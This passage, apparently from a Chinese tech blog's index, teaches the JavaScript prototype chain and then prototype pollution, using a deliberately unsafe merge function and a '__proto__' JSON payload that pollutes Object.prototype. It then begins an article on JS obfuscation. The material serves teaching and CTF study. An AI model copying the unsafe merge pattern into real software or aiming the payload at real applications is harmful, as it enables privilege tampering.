class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;Rover&quot;</span>);</span><br><span class="line">        System.out.println(dog.name); <span class="comment">// Rover</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Brendam 为 JS 做了简化设计，直接对构造函数使用<code>new</code>创建实例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;Rover&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">name</span>) <span class="comment">// Rover</span></span><br></pre></td></tr></table></figure><p>这种设计避免了在 JS 中引入 class，但这引出一个问题：JS 的实例该如何共享属性和方法？基于构造函数创建的实例都是独立的副本。</p><p>先看看 Java 是如何基于 class 实现属性和方法共享的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal is eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog is barking&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">meow</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Cat is meowing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">myDog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">myCat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">        </span><br><span class="line">        myDog.eat(); <span class="comment">// Animal is eating</span></span><br><span class="line">        myDog.bark(); <span class="comment">// Dog is barking</span></span><br><span class="line">        myCat.eat(); <span class="comment">// Animal is eating</span></span><br><span class="line">        myCat.meow(); <span class="comment">// Cat is meowing</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>Dog</code>和<code>Cat</code>子类继承了<code>Animal</code>父类的<code>eat()</code>方法，并分别添加了<code>bark()</code>和<code>meow()</code>方法，这种基于类实现的继承很顺畅也便于理解。</p><p>JS 中没有 class，但这种需求切实存在。Brendan 通过为构造函数添加<code>prototype</code>属性解决这个问题。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dogA = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;Rover&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> dogB = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;Fido&quot;</span>);</span><br><span class="line">dogA.<span class="title function_">bark</span>(); <span class="comment">// Rover</span></span><br><span class="line">dogB.<span class="title function_">bark</span>(); <span class="comment">// Fido</span></span><br></pre></td></tr></table></figure><p>我们给构造函数<code>Dog</code>的<code>prototype</code>添加了<code>bark()</code>方法，这样做的话，基于<code>Dog</code>创建的实例都可以使用<code>bark()</code>方法，数据共享同理。</p><p>那这是如何实现的呢，或者说，<code>prototype</code>是什么，为什么可以在多个实例之间共享属性及方法？这就是我们接下来要说的内容。</p><p>在这里先丢一张图，接下来的内容可以搭配这张图一起看，相信这会对初学者理解 JS 原型链很有帮助：</p><p><img src="https://wiki.wgpsec.org/images/js-prototype-chain-pollution/3.png" alt="img"></p><h2 id="prototype-原型"><a href="#prototype-原型" class="headerlink" title="prototype 原型"></a>prototype 原型</h2><p>在 JS 中，每个函数都有一个<code>prototype</code>属性，每个对象都有一个<code>__proto__</code>属性。</p><p>函数的<code>prototype</code> 属性本质上是一个对象，它包含了通过这个函数作为构造函数（即使用 <code>new</code> 关键字）创建的所有实例所共享的属性和方法。</p><p>而<code>__proto__</code>是所有对象都有的一个属性，它指向了创建这个对象的构造函数的<code>prototype</code>。也就是说，如果我们有<code>var dog = new Dog()</code>，那么<code>dog.__proto__</code>就是<code>Dog.prototype</code>。</p><blockquote><p>“引用”是指一个变量或者对象指向内存中的一个位置，这个位置存储了某个值。这里也可以说<code>dog.__proto__</code>是<code>Dog.prototype</code>的一个引用。</p></blockquote><p>那么 JS 是如何通过<code>prototype</code>实现继承的呢？</p><p>当我们试图访问一个对象的属性时，如果该对象本身没有这个属性，JS 就会去它的<code>__proto__</code>（也就是它的构造函数的<code>prototype</code>）中寻找。因为<code>prototype</code>本身也是一个对象，如果 JS 在<code>prototype</code>中也没有找到被访问的属性，那么它就会去<code>prototype</code>的<code>__proto__</code>中寻找，以此类推，直到找到这个属性或者到达原型链的末端<code>null</code>。</p><p>通过这种方式，JS 就实现了它所需要的继承机制。这种通过对象的<code>__proto__</code>属性逐步向上查询的机制，就是我们所说的 JS 原型链。</p><p>再拿这个例子做一次讲解：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">  <span class="string">&quot;species&quot;</span>: <span class="string">&quot;dog&quot;</span>,</span><br><span class="line">&#125; </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&#x27;Rover&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">name</span>); <span class="comment">// Rover</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">species</span>); <span class="comment">// dog</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">age</span>); <span class="comment">// undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>); <span class="comment">// null</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">__proto__</span> === <span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>) <span class="comment">// null</span></span><br></pre></td></tr></table></figure><p>调用<code>dog.name</code>时，JS 查找到<code>dog</code>实例有<code>name</code>属性，就返回<code>Rover</code>；</p><p>调用<code>dog.species</code>时，JS 发现当前实例中没有该属性，就去<code>dog.__proto__</code>中查询，找到<code>species</code>属性并返回<code>dog</code>；</p><p>调用<code>dog.age</code>时，JS 发现当前实例和当前实例的<code>__proto__</code>属性中都没有该属性，就再向上去寻找，也就到<code>Dog.prototype.__proto__</code>（即<code>Object.prototype</code>）中去寻找，已然没有找到，就继续向上找，但<code>Object.prototype.__proto__</code>是整条原型链的起点——<code>null</code>，JS 查找不到<code>age</code>属性，就会返回一个<code>undefined</code>；</p><p>如果我们再向上查询一层，即尝试访问<code>dog.__proto__.__proto__.__proto__.__proto__</code>，会直接抛出报错，JS 定义<code>null</code>没有原型，yejiu1无法访问到它的<code>prototype</code>属性。</p><h2 id="constructor-构造函数"><a href="#constructor-构造函数" class="headerlink" title="constructor 构造函数"></a>constructor 构造函数</h2><p>在 JS 中，每个函数对象还有一个特殊的属性叫做<code>constructor</code>。这个属性指向创建该对象的构造函数。当我们创建一个函数时，JS 会自动为该函数创建一个<code>prototype</code>对象，并且这个<code>prototype</code>对象包含一个指向该函数本身的<code>constructor</code>属性。</p><p>当我们使用构造函数创建实例对象时，这些实例对象会继承构造函数的<code>prototype</code>对象，从而形成原型链。因此，通过<code>constructor</code>属性，实例对象就可以访问到创建它们的构造函数。</p><p>直接把<code>constructor</code>当作反向<code>prototype</code>理解即可。以刚才的代码举例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> === <span class="title class_">Dog</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="前端开发中的原型链"><a href="#前端开发中的原型链" class="headerlink" title="前端开发中的原型链"></a>前端开发中的原型链</h2><h3 id="class-语法糖"><a href="#class-语法糖" class="headerlink" title="class 语法糖"></a>class 语法糖</h3><p>现在的 Web 前端开发中几乎不直接使用原型链了，JS 已经在 ES6（ECMAScript 2015）中引入了类（Class）的概念，因为这能使得面向对象编程更加直观。</p><p>个人感觉这表示着 JS 与 Brendan Eich 当年所设想的“简单的客户端脚本语言”越走越偏了，但这也说明 JS 一直在蓬勃发展，活跃的社区生态让 JS 把它的触手伸向了互联网的角角落落，越来越多的开发者将 JS 变得愈来愈完善。</p><p>但请注意，JS 的 class 在底层上仍然是基于原型链的，只是一种语法糖。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">speak</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&#x27; makes a noise.&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> animal = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;Simba&#x27;</span>);</span><br><span class="line">animal.<span class="title function_">speak</span>(); <span class="comment">// Outputs: &quot;Simba makes a noise.&quot;</span></span><br></pre></td></tr></table></figure><p>以上代码是一个使用了 class 的 JS 示范，其基于原型链的版本如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">speak</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span> + <span class="string">&#x27; makes a noise.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> animal = <span class="keyword">new</span> <span class="title class_">Animal</span>(<span class="string">&#x27;Simba&#x27;</span>);</span><br><span class="line">animal.<span class="title function_">speak</span>(); <span class="comment">// Outputs: &quot;Simba makes a noise.&quot;</span></span><br></pre></td></tr></table></figure><p>这两个例子在功能上是相同的，但是它们的写法有所不同。class 语法提供了一种更清晰的方式来创建对象和处理继承。在 class 语法中，你可以直接在类定义内部声明方法，而在原型链中，你需要在原型对象上添加方法。</p><h3 id="性能影响"><a href="#性能影响" class="headerlink" title="性能影响"></a>性能影响</h3><p>我们前面说过，JS 在原型链中查找当前对象不存在的属性时，需要一级级的向上查找。如果我们要查找的属性在较深层的对象中，就会拖慢我们程序的运行速度；如果目标属性不存在中，JS 就会遍历整个原型链，这无疑会对程序的性能造成负面影响。</p><p>此外，在遍历对象的属性时，原型链中的每个可枚举属性都将被枚举。如果我们想要检查一个对象是否具有某个属性，并且这个属性是直接定义在该对象上的，而不是定义在它的原型链上的，那么我们需要使用<code>hasOwnProperty</code>方法或<code>Object.hasOwn</code>方法。</p><p><code>hasOwnProperty</code>可以用来检查一个对象是否具有特定的自身属性（也就是该属性不是从原型链上继承来的）。这个方法是定义在<code>Object.prototype</code>上的，所以除非一个对象的原型链被设置为<code>null</code>（或者在原型链深层被覆盖），否则所有的对象都会继承这个方法。</p><p>该方法的使用方法如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="attr">prop</span>: <span class="string">&#x27;value&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;prop&#x27;</span>)); <span class="comment">// 输出：true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> objWithNoProto = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objWithNoProto.<span class="property">hasOwnProperty</span>); <span class="comment">// 输出：undefined</span></span><br></pre></td></tr></table></figure><p>此外，除非是为了与新的 JS 特性兼容，否则永远不应扩展原生原型。如果要使用 JS 原型链操作，也要对用户的输入进行严格校验，因为 JS 原型链有着独特的安全问题。</p><h2 id="JS-原型链污染"><a href="#JS-原型链污染" class="headerlink" title="JS 原型链污染"></a>JS 原型链污染</h2><blockquote><p>JS 原型链污染推荐 phithon 大佬的 <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03">深入理解 JavaScript Prototype 污染攻击</a>，以下<code>merge</code>示范代码就来自这篇文章。</p></blockquote><p>出于设计上的因素，JS 原型链操作容易产生独特的安全问题——JS 原型链污染。</p><p>原理很简单，就是 JS 基于原型链实现的继承机制。如果我们能控制某个对象的原型，那我们就可以控制所有基于该原型创建的对象。以下是一个简单的示范案例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个空对象 userA</span></span><br><span class="line"><span class="keyword">let</span> userA = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 给 userA 添加一个属性 isAdmin</span></span><br><span class="line">userA.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(userA.<span class="property">isAdmin</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在我们想让所有用户都有这个属性，我们可以使用原型</span></span><br><span class="line">userA.<span class="property">__proto__</span>.<span class="property">isAdmin</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(userA.<span class="property">isAdmin</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在我们创建一个新用户 userB</span></span><br><span class="line"><span class="keyword">let</span> userB = &#123;&#125;;</span><br><span class="line"><span class="comment">// userB 会继承 userA 的 isAdmin 属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(userB.<span class="property">isAdmin</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>在 CTF 中，往往都是去找一些能够控制对象键名的操作，比如<code>merge</code>、<code>clone</code>等，这其中<code>merge</code>又是最常见的可操纵键名操作。最普通的<code>merge</code>函数如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">      <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">          <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          target[key] = source[key]</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，我们运行以下代码，以 JSON 格式创建<code>o2</code>，在与<code>o1</code>合并的过程中，经过赋值操作<code>target[key] = source[key]</code>，实现了一个基本的原型链污染，被污染的对象是<code>Object.prototype</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">merge</span>(o1, o2); <span class="comment">// 1 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>);</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// [Object: null prototype] &#123; b: 2 &#125;</span></span><br></pre></td></tr></table></figure><p>还有一个值得思考的问题，如果我们创建<code>o2</code>使用的语句是：<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>，则不会实现原型链污染，可以思考一下原因。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>读到这里，应该就能大致理解什么是 JS 原型链了，也对开发和安全中的 JS 原型链有了一个基本的认识。</p><p>但还有一个疑问没有解决：JS 原型链的本质是什么，它是一种机制，还是一种数据结构？</p><p>原型链（Prototype Chain）从本质上来讲是一种机制，而不是某种特殊的数据结构。只是从习惯上来讲，我们会把从实例对象到 Object 这中间的 <code>__proto__</code> 调用称为“原型链”，上面说过的<code>dog.__proto__.__proto__.__proto__</code>就是例子——因为这确实很形象。</p><h2 id="参阅文章"><a href="#参阅文章" class="headerlink" title="参阅文章"></a>参阅文章</h2><ul><li><a href="https://www.ruanyifeng.com/blog/2011/06/designing_ideas_of_inheritance_mechanism_in_javascript.html">Javascript继承机制的设计思想</a>，by 阮一峰的网络日志</li><li><a href="https://blog.huli.tw/2017/08/27/the-javascripts-prototype-chain/">該來理解 JavaScript 的原型鍊了</a>，by Huli’s Blog</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain">继承与原型链</a>，by MDN Web Docs</li><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x03">深入理解 JavaScript Prototype 污染攻击</a>，by phithon</li></ul>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> JavaScript Prototype Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript混淆与反混淆</title>
      <link href="/2024/02/12/2024/js-obfuscation-deobfuscation/"/>
      <url>/2024/02/12/2024/js-obfuscation-deobfuscation/</url>
      
        <content type="html"><![CDATA[<h2 id="Obfuscation-混淆"><a href="#Obfuscation-混淆" class="headerlink" title="Obfuscation 混淆"></a>Obfuscation 混淆</h2><p>JavaScript 混淆（Obfuscation）是指通过一系列技术手段，使 JS 代码变得难以理解和分析，增加代码的复杂性和混淆度，阻碍逆向工程和代码盗用。实际上就是一种保护 JS 代码的手段。</p><p>那为什么我们需要保护 JS 代码呢 🤔️</p><p>JS 最早被设计出来就是为了在客户端运行，直接以源码的形式传递给客户端，如果不做处理则完全公开透明，任何人都可以读、分析、复制、盗用，甚至篡改源码与数据，这是网站开发者不愿意看到的。</p><h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>早期的 JS 代码承担功能少，逻辑简单且体积小，不需要保护。但随着技术的发展，JS 承担的功能越来越多， 文件体积增大。为了优化用户体验，开发者们想了很多办法去减小 JS 文件体积，以加快 HTTP 传输速度。JS 压缩（Minification）技术应运而生。</p><p>常见的 JS 压缩手段很多，比如：</p><ul><li>删除 JS 代码中的空格、换行与注释；</li><li>替换 JS 代码中的局部变量名；</li><li>合并 JS 文件；</li><li>……</li></ul><p>压缩工具开发的初衷是减小 JS 文件体积，但 JS 代码经过压缩替换后，其可读性也大大降低，间接起到了保护代码的作用。但是后来主流浏览器的开发者工具都提供了格式化代码的功能，压缩技术所能提供的安全保护收效甚微。于是专门保护 JS 代码的技术：JS 加密和 JS 混淆。</p><blockquote><p>本文不会介绍 JS 加密技术，只需要知道这两种技术相辅相成，不预先进行混淆的 JS 加密没有意义。</p></blockquote><h3 id="常见混淆手段"><a href="#常见混淆手段" class="headerlink" title="常见混淆手段"></a>常见混淆手段</h3><ul><li><p>变量名&#x2F;函数名的替换，通过将有意义的变量名和函数名替换为随机生成的名称。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function calculateArea(radius) &#123;</span></span><br><span class="line"><span class="comment">  return Math.PI * radius * radius;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">console.log(calculateArea(5));</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_0x2d8f05</span>(<span class="params">_0x4b083b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="property">PI</span> * _0x4b083b * _0x4b083b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">_0x2d8f05</span>(<span class="number">5</span>));</span><br></pre></td></tr></table></figure></li><li><p>字符串混淆，将代码中的字符串替换为编码或加密的形式，可以防止字符串被轻易读取。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// console.log(&quot;Hello, world!&quot;);</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>控制流混淆，改变代码的执行顺序或结构。例如，可以使用条件语句和循环语句来替换简单的赋值操作。</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">let a = 1;</span></span><br><span class="line"><span class="comment">let b = 2;</span></span><br><span class="line"><span class="comment">let c = a + b;</span></span><br><span class="line"><span class="comment">console.log(c);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">let</span> c;</span><br><span class="line"><span class="keyword">if</span> (a === <span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (b === <span class="number">2</span>) &#123;</span><br><span 